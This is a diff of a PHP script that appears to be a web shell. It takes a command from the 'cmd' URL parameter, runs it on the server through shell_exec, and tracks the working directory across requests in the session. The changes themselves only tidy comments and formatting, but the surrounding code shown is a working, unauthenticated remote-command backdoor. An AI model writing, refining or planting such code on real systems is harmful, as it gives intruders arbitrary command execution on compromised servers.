@@ -24,24 +24,22 @@ if (!isset($_GET['cmd']) || $_GET['cmd'] == null) {
     $cmd = "whoami"; #Default command
 } else {
     $cmd = $_GET['cmd'];
-    #We will add ; after the $_GET['cmd'] so we need to remove the `;` from the end in case the user put it there (Idk if you know what I'm talking about)
+    #We will add ; after the $_GET['cmd'] so we need to remove the `;` from the end in case the user put it there
     if ($cmd[strlen($cmd) - 1] == ";") {
         $cmd = substr($cmd, 0, -1);
     }
-                                                                    }### START OF PHP
+}
 
 #THE COMMAND THAT WILL EXECUTE
 $ot_cmd = shell_exec("cd " . $location . ";" . $cmd . ";echo '\n###Current path';pwd;"); # IN CASE YOU ARE EDDITING THIS DON'T REMOVE THE (pwd) command since we use it later
 
 
 try {
-    #Getting the return of whoami from $ot_cmd
+    #Getting the return of pwd from $ot_cmd
     $output_list =  explode("\n", $ot_cmd);
     $_SESSION['location'] = $output_list[sizeof($output_list) - 2];
     $location = $_SESSION['location'];
-} catch (exception $e) {
-    //handle the exception, BUT I DON'T EVEN CARE ABOUT THE exception
-}
+} catch (exception $e) {}
 
 ### END OF PHP
 ?>
